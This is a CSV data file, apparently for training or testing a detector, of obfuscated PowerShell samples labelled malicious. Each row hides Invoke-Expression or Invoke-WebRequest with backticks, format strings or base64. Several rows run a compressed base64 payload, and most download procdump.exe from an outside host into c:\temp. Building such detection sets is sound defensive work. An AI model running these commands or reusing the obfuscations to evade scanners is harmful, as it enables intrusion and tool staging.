variant_id,seed_id,filename,label,target_token,technique_id,family,runtime_target,variant_rank,indicator_family_targeted,indicator_count_before,indicator_count_after,literal_indicator_removed,raw_char_len,used_char_len,was_truncated,viability_status,viability_reason,static_parse_ok,static_invariants_ok,manual_review_required,parent_content_hash,variant_content_hash,content,seed_primary_indicator,candidate_tier,candidate_reason
variant_b91979432b34,seed_a182289ca98a,2019__seed_a182289ca98a__invoke_expression_subexpression_string.ps1,malicious,BLOCK,invoke_expression_subexpression_string,string_construction,cross_runtime,4,Invoke-Expression,2,1,True,1183,1183,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,2a5d78257e7e,"&(""$('Invoke-')Expression"") $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
variant_13af80fbe811,seed_4916dd4c361c,2019__seed_4916dd4c361c__invoke_expression_backtick_string.ps1,malicious,BLOCK,invoke_expression_backtick_string,keyword_hiding,cross_runtime,1,Invoke-Expression,2,1,True,1179,1179,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,df12bdb136c8,"&(""Invoke-`Expression"") $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
variant_9ba9a02d030b,seed_4916dd4c361c,2019__seed_4916dd4c361c__invoke_expression_format_string.ps1,malicious,BLOCK,invoke_expression_format_string,keyword_hiding,cross_runtime,2,Invoke-Expression,2,1,True,1195,1195,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,e54475688a3d,"&(('{0}{1}' -f 'Invoke-','Expression')) $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
variant_5bd344cc3258,seed_4916dd4c361c,2019__seed_4916dd4c361c__invoke_expression_base64_ascii.ps1,malicious,BLOCK,invoke_expression_base64_ascii,string_construction,cross_runtime,3,Invoke-Expression,2,2,True,1248,1248,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,767211b352d9,"&([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
variant_217c0ff1da45,seed_4916dd4c361c,2019__seed_4916dd4c361c__invoke_expression_subexpression_string.ps1,malicious,BLOCK,invoke_expression_subexpression_string,string_construction,cross_runtime,4,Invoke-Expression,2,1,True,1183,1183,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,d8b40e6d331b,2a5d78257e7e,"&(""$('Invoke-')Expression"") $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",Invoke-Expression,strict,parse_valid_and_invariants_ok
variant_46203ed9fc86,seed_94c9b9d4d0af,1362__seed_94c9b9d4d0af__invoke_webrequest_backtick_string.ps1,malicious,BLOCK,invoke_webrequest_backtick_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,1,0,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,beae3e888129,"&(""Invoke-`WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_5c877643ef04,seed_94c9b9d4d0af,1362__seed_94c9b9d4d0af__invoke_webrequest_format_string.ps1,malicious,BLOCK,invoke_webrequest_format_string,keyword_hiding,cross_runtime,2,Invoke-WebRequest,1,0,True,102,102,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,bc21d2d51950,"&(('{0}{1}' -f 'Invoke-','WebRequest')) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_64770b3e27dd,seed_94c9b9d4d0af,1362__seed_94c9b9d4d0af__invoke_webrequest_base64_ascii.ps1,malicious,BLOCK,invoke_webrequest_base64_ascii,string_construction,cross_runtime,3,Invoke-WebRequest,1,1,True,155,155,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,c0b70210f5eb,&([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q='))) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_b5b264434b91,seed_94c9b9d4d0af,1362__seed_94c9b9d4d0af__invoke_webrequest_subexpression_string.ps1,malicious,BLOCK,invoke_webrequest_subexpression_string,string_construction,cross_runtime,4,Invoke-WebRequest,1,0,True,90,90,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,0e868be34a3d,"&(""$('Invoke-')WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_9ac1f2dc4ded,seed_62bd78f5d825,1362__seed_62bd78f5d825__invoke_webrequest_backtick_string.ps1,malicious,BLOCK,invoke_webrequest_backtick_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,1,0,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,beae3e888129,"&(""Invoke-`WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_094155d7686b,seed_62bd78f5d825,1362__seed_62bd78f5d825__invoke_webrequest_format_string.ps1,malicious,BLOCK,invoke_webrequest_format_string,keyword_hiding,cross_runtime,2,Invoke-WebRequest,1,0,True,102,102,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,bc21d2d51950,"&(('{0}{1}' -f 'Invoke-','WebRequest')) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_48b7a3c3d5a0,seed_62bd78f5d825,1362__seed_62bd78f5d825__invoke_webrequest_base64_ascii.ps1,malicious,BLOCK,invoke_webrequest_base64_ascii,string_construction,cross_runtime,3,Invoke-WebRequest,1,1,True,155,155,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,c0b70210f5eb,&([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q='))) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_c43b405ae7ee,seed_62bd78f5d825,1362__seed_62bd78f5d825__invoke_webrequest_subexpression_string.ps1,malicious,BLOCK,invoke_webrequest_subexpression_string,string_construction,cross_runtime,4,Invoke-WebRequest,1,0,True,90,90,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,0e868be34a3d,"&(""$('Invoke-')WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_b3716d23fcc3,seed_e20ff31d1bd4,1362__seed_e20ff31d1bd4__invoke_webrequest_backtick_string.ps1,malicious,BLOCK,invoke_webrequest_backtick_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,1,0,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,beae3e888129,"&(""Invoke-`WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_743723fb0f00,seed_e20ff31d1bd4,1362__seed_e20ff31d1bd4__invoke_webrequest_format_string.ps1,malicious,BLOCK,invoke_webrequest_format_string,keyword_hiding,cross_runtime,2,Invoke-WebRequest,1,0,True,102,102,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,bc21d2d51950,"&(('{0}{1}' -f 'Invoke-','WebRequest')) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_9cdf479adcfd,seed_e20ff31d1bd4,1362__seed_e20ff31d1bd4__invoke_webrequest_base64_ascii.ps1,malicious,BLOCK,invoke_webrequest_base64_ascii,string_construction,cross_runtime,3,Invoke-WebRequest,1,1,True,155,155,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,c0b70210f5eb,&([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q='))) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_a37797569fe6,seed_e20ff31d1bd4,1362__seed_e20ff31d1bd4__invoke_webrequest_subexpression_string.ps1,malicious,BLOCK,invoke_webrequest_subexpression_string,string_construction,cross_runtime,4,Invoke-WebRequest,1,0,True,90,90,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,0e868be34a3d,"&(""$('Invoke-')WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_e97e91c62aeb,seed_c4fb6569b404,1362__seed_c4fb6569b404__invoke_webrequest_backtick_string.ps1,malicious,BLOCK,invoke_webrequest_backtick_string,keyword_hiding,cross_runtime,1,Invoke-WebRequest,1,0,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,beae3e888129,"&(""Invoke-`WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_e4e999058709,seed_c4fb6569b404,1362__seed_c4fb6569b404__invoke_webrequest_format_string.ps1,malicious,BLOCK,invoke_webrequest_format_string,keyword_hiding,cross_runtime,2,Invoke-WebRequest,1,0,True,102,102,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,bc21d2d51950,"&(('{0}{1}' -f 'Invoke-','WebRequest')) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_9837e99c01c2,seed_c4fb6569b404,1362__seed_c4fb6569b404__invoke_webrequest_base64_ascii.ps1,malicious,BLOCK,invoke_webrequest_base64_ascii,string_construction,cross_runtime,3,Invoke-WebRequest,1,1,True,155,155,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,c0b70210f5eb,&([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3Q='))) -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,Invoke-WebRequest,strict,parse_valid_and_invariants_ok
variant_e592350e2987,seed_c4fb6569b404,1362__seed_c4fb6569b404__invoke_webrequest_subexpression_string.ps1,malicious,BLOCK,invoke_webrequest_subexpression_string,string_construction,cross_runtime,4,Invoke-WebRequest,1,0,True,90,90,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",True,True,True,eeab8286a4a0,0e868be34a3d,"&(""$('Invoke-')WebRequest"") -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe",Invoke-WebRequest,strict,parse_valid_and_invariants_ok
